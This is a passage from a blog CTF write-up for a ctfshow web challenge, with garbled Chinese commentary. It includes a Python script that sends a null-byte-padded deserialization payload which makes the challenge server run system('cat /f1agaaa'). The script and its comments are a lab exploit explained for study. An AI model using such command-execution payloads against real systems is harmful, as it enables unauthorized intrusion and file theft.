</span></span><span class="line"><span class="cl">seek()æ–¹æ³•ä¼šå°†ç¼“å†²åŒºçš„æŒ‡é’ˆä½ç½®è®¾ç½®ä¸ºå½“å‰çš„ $cursorã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">truncation()æ–¹æ³•ä¼šå°†å­—èŠ‚ä¸²ä¸­çš„ç©ºå­—èŠ‚å»é™¤ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">checkRef()æ–¹æ³•ä¼šæ£€æŸ¥å¼•ç”¨çš„é•¿åº¦æ˜¯å¦è¶…è¿‡é™åˆ¶ï¼Œå¹¶ä¸”æ£€æŸ¥å¼•ç”¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºæ•°å­—ã€‚å¦‚æœæ£€æŸ¥å¤±è´¥ï¼Œå®ƒä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2payload-1">2.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://e89d2c6d-e01e-4fef-9510-bf760aa69af6.challenge.ctf.show/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;data&#34;</span><span class="p">:</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">50</span><span class="o">+</span><span class="s2">&#34;flag&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">19</span><span class="o">+</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">32</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">20</span><span class="o">+</span><span class="s2">&#34;system&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">18</span><span class="o">+</span><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">50</span><span class="o">+</span><span class="s2">&#34;flag&#34;</span><span class="err">ï¼š</span><span class="n">Aå­—ç¬¦é‡å¤</span> <span class="mi">50</span> <span class="n">æ¬¡</span><span class="err">ï¼Œ</span><span class="n">å†æ‹¼æ¥ä¸Šå­—ç¬¦ä¸²</span> <span class="s2">&#34;flag&#34;</span><span class="err">ï¼Œ</span><span class="n">æ»¡è¶³æœåŠ¡å™¨å¯¹è¾“å…¥æ•°æ®é•¿åº¦çš„é™åˆ¶</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">19</span><span class="err">ï¼š</span><span class="n">ç©ºå­—ç¬¦</span> <span class="p">(</span>\<span class="n">x00</span><span class="p">)</span> <span class="n">é‡å¤</span> <span class="mi">19</span> <span class="n">æ¬¡</span><span class="err">ï¼Œ</span><span class="n">è¿™äº›ç©ºå­—ç¬¦ç”¨äºå¡«å……æ•°æ®</span><span class="err">ï¼Œ</span><span class="n">ä½¿å¾—æ•°æ®é•¿åº¦è¾¾åˆ°è¦æ±‚</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">32</span><span class="err">ï¼š</span><span class="n">Bå­—ç¬¦é‡å¤</span> <span class="mi">32</span> <span class="n">æ¬¡</span><span class="err">ï¼Œ</span><span class="n">æ»¡è¶³è¾“å…¥é•¿åº¦çš„é™åˆ¶</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">20</span><span class="err">ï¼š</span><span class="n">ç©ºå­—ç¬¦é‡å¤</span> <span class="mi">20</span> <span class="n">æ¬¡</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;system&#34;</span><span class="err">ï¼š</span><span class="n">è¡¨ç¤ºéœ€è¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">18</span><span class="err">ï¼š</span><span class="n">ç©ºå­—ç¬¦é‡å¤</span> <span class="mi">18</span> <span class="n">æ¬¡</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="err">ï¼š</span><span class="n">éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</span><span class="err">ï¼Œ</span><span class="n">å³è¯»å–</span> <span class="o">/</span><span class="n">f1agaaa</span> <span class="n">æ–‡ä»¶çš„å†…å®¹</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">8</span><span class="err">ï¼š</span><span class="n">åŠ ä¸Š</span> <span class="mi">8</span> <span class="n">ä¸ªç©ºå­—ç¬¦å¡«å……æ•°æ®</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">æ„é€ ä¸€ä¸ªé•¿åº¦ç¬¦åˆè¦æ±‚çš„å­—ç¬¦ä¸²</span><span class="err">ï¼Œ</span><span class="n">å°†å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºç³»ç»Ÿå‘½ä»¤è¿›è¡Œæ‰§è¡Œ</span><span class="err">ï¼Œ</span><span class="n">ä»è€Œè·å–flag</span><span class="err">ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/web/">web</a>
        
            <a href="/tags/ctf/">ctf</a>
        
            <a href="/tags/ctfshow/">ctfshow</a>
        
            <a href="/tags/%E6%84%9A%E4%BA%BA%E6%9D%AF/">æ„šäººæ¯</a>
        
            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">ååºåˆ—åŒ–</a>
        
            <a href="/tags/ssti/">SSTI</a>
        
            <a href="/tags/session/">session</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/ctfshow-%E5%B9%B4ctf-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">ctfshow-å¹´CTF-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/ctfshow-%E6%96%B0%E6%89%8B%E6%9D%AF-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">ctfshow-æ–°æ‰‹æ¯-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
        
        

        <div class="article-details">
            <h2 class="article-title">ä¿¡æ¯æ”¶é›†</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/parse_url/">
        
        

        <div class="article-details">
            <h2 class="article-title">PARSE_URL</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="Relish1one/blog_data"
        issue-term="pathname"
        
        label="none"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2022 - 
        
        2023 R1one&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<script
    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
    crossorigin="anonymous"
    size="300"
    alpha="0.6"
    zindex="-1"
    defer
></script>

<script
    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/nprogress.min.js"
    integrity="sha384-bHDlAEUFxsRI7JfULv3DTpL2IXbbgn4JHQJibgo5iiXSK6Iu8muwqHANhun74Cqg"
    crossorigin="anonymous"
></script>
<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/css/nprogress.css"
    integrity="sha384-KJyhr2syt5+4M9Pz5dipCvTrtvOmLk/olWVdfhAp858UCa64Ia5GFpTN7+G4BWpE"
    crossorigin="anonymous"
/>
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>

    </body>
</html>
